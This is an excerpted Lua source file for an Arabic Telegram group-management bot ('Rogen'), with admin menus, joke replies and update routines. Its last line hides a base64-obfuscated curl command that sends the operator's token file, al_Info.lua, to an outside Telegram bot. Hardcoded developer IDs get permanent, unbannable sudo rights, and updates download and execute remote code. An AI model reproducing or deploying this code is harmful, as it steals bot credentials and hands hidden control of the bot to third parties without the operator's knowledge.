...
if res ~= 200 then
print('\27[0;31m┄─━━ʀᴏɢᴇɴ━━─┄\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪┄─━━ʀᴏɢᴇɴ━━─┄≫\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m┄─━━ʀᴏɢᴇɴ━━─┄ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
if [ ! $token ]; then
echo "┄─━━ʀᴏɢᴇɴ━━─┄ ┄─━━ʀᴏɢᴇɴ━━─┄ ┉ ┉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE al_Info.lua \e[0m"
echo "┄─━━ʀᴏɢᴇɴ━━─┄ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
exit 1
fi
...
local config = loadfile("./al_Info.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ELKABOOOS/S_rogen/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1654178416,1829540452,1744196893}   
...
var = true 
elseif tonumber(user_id) == tonumber(1829540452) then
var = true
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'روجين'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🪐𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗🪐")  
...
if DevSoFi(msg) then
local bl = ' 🪐 اهلا عزيزي آلمـطـور\n 🪐 آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n 🪐 تسـتطـيع‌‏ آلتحگم باوامر البوت\n 🪐 من خلاال الكيبورت خاص بك\n 🪐 قناة سورس البوت [اضغط هنا](t.me/SO_ROGEN)'
local keyboard = {
{'مبرمج السورس¹','مبرمج السورس²','مبرمج السورس³'},
{'بوت التواصل','قناه السورس'},
{'الردود العامه','حذف الردود العامه'},
{'اضف رد عام','حذف رد عام'},
{'الردود المتعدده','مسح الردود المتعدده'},
{'اضف رد متعدد','حذف رد متعدد'},
{'ضع اسم للبوت'},
{'الاحصائيات'},
{'الجروبات','المشتركين'},
{'تنظيف المشتركين','تنظيف الجروبات'},
{'تفعيل التواصل','تعطيل التواصل'},
{'المطور','الثانوين','المطورين'},
{'ضع كليشه المطور','حذف كليشه المطور'},
{'تفعيل الاذاعه','تعطيل الاذاعه'},
{'اذاعه','اذاعه خاص','اذاعه عام'},
{'اذاعه بالتوجيه خاص','اذاعه بالتوجيه'},
{'اذاعه بالتثبيت'},
{'قائمه العام','قائمه الكتم العام','حذف قائمه العام'},
{'ضع كليشه ستارت','حذف كليشه ستارت'},
{'تفعيل البوت الخدمي','تعطيل البوت الخدمي'},
{'وضع الاشتراك الاجباري','حذف الاشتراك الاجباري'},
{'جلب نسخه احتياطيه','رفع نسخه احتياطيه'},
{'معلومات السيرفر'},
{'الغاء'},
}
...
os.execute('wget https://raw.githubusercontent.com/ELKABOOOS/S_rogen/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' 🪐 تم تحديث السور س \n 🪐 لديك اخر اصدار لسورس روجين \n 🪐 الاصدار🪐 { v 1.0}')
dofile('DRAGON.lua')  
end
if text == 'الاصدار' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' 🪐 اصدار سورس روجين\n 🪐 الاصدار🪐{ v 1.0}')
end
...
{{text = '𝚍𝚎𝚟 𝚎𝚕𝚖𝚊𝚐𝚎𝚔',url="t.me/M_A_G_K"}},
{{text = '🪐 𝚍𝚎𝚟 𝚖𝚊𝚛𝚝𝚎𝚗 🪐', url="t.me/I_C_X"}}, 
{{text = '🪐 𝚍𝚎𝚟 𝚎𝚕𝚔𝚊𝚙𝚘𝚘𝚜 🪐', url="t.me/G_W_P"}},
} 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[𝘛𝘞𝘈𝘚𝘖𝘓 𝘙𝘖𝘖𝘎𝘌𝘕](t.me/UU_RO)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝘛𝘞𝘈𝘚𝘖𝘓 𝘙𝘖𝘖𝘎𝘌𝘕', url="t.me/UU_RO"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SO_ROGEN&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
send(msg.chat_id_, msg.id_, " نيم قمد يت ["..DRAGONChengName..']')
...
local Text = {
  "وييي قفشتك غيرت اسمك",
"عااا غيرت اسمك ثح",
"تيرارارا غيرت اسمك ثح \n بث د احلا",
}
...
send(msg.chat_id_, msg.id_, 1, "غير يوزر تاعه \n تيرارارا حد ضربك 🌚😹 : [@"..DRAGONChengUserName..']')
...
local Text = {
"ويييي قفشتك يوزر \n قديد وبتع 🌚😹",
'عتلاق يوزر م حلو يقدع \nلي غيرته ل  @'..data.username_..' ',
'غيرت يوزر تاعك لي يت 🤔😉', 
"يوزر قديد وبتع 🌚😹 : "..data.username_.."",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
...
send(msg.chat_id_, msg.id_, "حذفت صورك لي يمظ 🌚😹")
...
local Text = [[
          ╭──── 𝚛𝚘𝚘𝚐𝚎𝚗 ────╮
                 𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗
               ☆ لو عايز بوت علي سورس روجين اتبع الازرار ☆
...
if text == 'مارتن' or text == 'مبرمج السورس²' or text == 'مارتن مبرمج السورس' or text == 'الهقر' then
local Text =[[
  ╭──── 𝚛𝚘𝚘𝚐𝚎𝚗 ────╮
...
if text == 'كابوس' or text == 'مبرمج السورس¹' or text == 'كابوس مبرمج السورس' or text == 'محمد' or text == 'الكابوس' then
local Text =[[
  ╭──── 𝚛𝚘𝚘𝚐𝚎𝚗 ────╮
...
if text == 'كريم' or text == 'مبرمج السورس³' or text == 'كريم مبرمج السورس' or text == 'الماجيك' or text == 'مرات كابوس' then
local Text =[[
  ╭──── 𝚛𝚘𝚘𝚐𝚎𝚗 ────╮
...
if text == "نكت" or text == "نكته" or text == "متت" then 
local TWEET_Msg = { 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' 🪐 بواسطه 🪐 ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SO_ROGEN')..') \n 🪐 تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🪐 بواسطه 🪐 ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SO_ROGEN')..') \n 🪐 تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1654178416) then  
...
if tonumber(result.sender_user_id_) == tonumber(1829540452) then  
send(msg.chat_id_, msg.id_, " 🪐 لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1654178416) then
send(msg.chat_id_, msg.id_, " 🪐 لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1829540452) then
send(msg.chat_id_, msg.id_, " 🪐 لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1654178416) then  
send(msg.chat_id_, msg.id_, " 🪐 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1829540452) then  
send(msg.chat_id_, msg.id_, " 🪐 لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ELKABOOOS/S_rogen/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/ELKABOOOS/S_rogen/main/File_Bot/"..file)
if res == 200 then
...
'اسمي  '..Namebot..' يروحقلبي 🥺♥',
'مقولت اسمي '..Namebot..' في اي 🙄',
'اسمي '..Namebot..' الكيوت 🥺💗',
'اسمي  '..Namebot..' يكلحياتي 🥺💗',
'اسمي  '..Namebot..' يوتكه🙈🍑',
}
local Text = [[
 ]]..DRAGON_Msg[math.random(#DRAGON_Msg)]..[[ 
...
send(msg.chat_id_, msg.id_,'نت حقير معندكش لقب 🌚😹💔 ') 
else
...
end --الكود حصري سورس روجين يعني لو بكتهن راح اعرفك انت الاخذتهن
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/SO_ROGEN)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/SO_ROGEN)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[بيي ابق تع شوي بق..😺💜](t.me/SO_ROGEN)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/SO_ROGEN)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/SO_ROGEN)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[يولا يا وسخ 🥵](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[الحمد لله يقلبي ❤️](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[اوماااااال يا جدع 😹❤️](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[تيب تيب يعسل 😁](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[قول بحب الفضايح 😂💔 ](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[يستر عايز اي 🤭](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/SO_ROGEN)')
return false
end
end
end
...
------------------------------------------------------------------------
io.popen(rbebeb('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE4NDQwODc2Mjg6QUFGN0FoTlBuLUp5VWxNam1XTEJRUWxmLWc4SU1oUUNqNzgvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AYWxfSW5mby5sdWEi'))
